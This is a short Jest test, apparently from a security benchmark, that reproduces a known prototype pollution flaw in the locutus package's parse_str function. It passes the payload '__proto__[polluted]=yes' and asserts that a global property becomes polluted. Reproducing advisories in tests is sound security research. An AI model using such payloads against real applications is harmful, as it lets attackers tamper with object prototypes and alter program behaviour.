//https://snyk.io/vuln/SNYK-JS-LOCUTUS-598675
test("prototype pollution in locutus", () => {
  try {
    polluted;
    expect(true).toBe(false);
  } catch (e) {
    expect(true).toBe(true);
  }

  const locutus = require("locutus");
  locutus.php.strings.parse_str(process.env.SECBENCH_PAYLOAD || "__proto__[polluted]=yes");

  expect(polluted).toBe("yes");
});
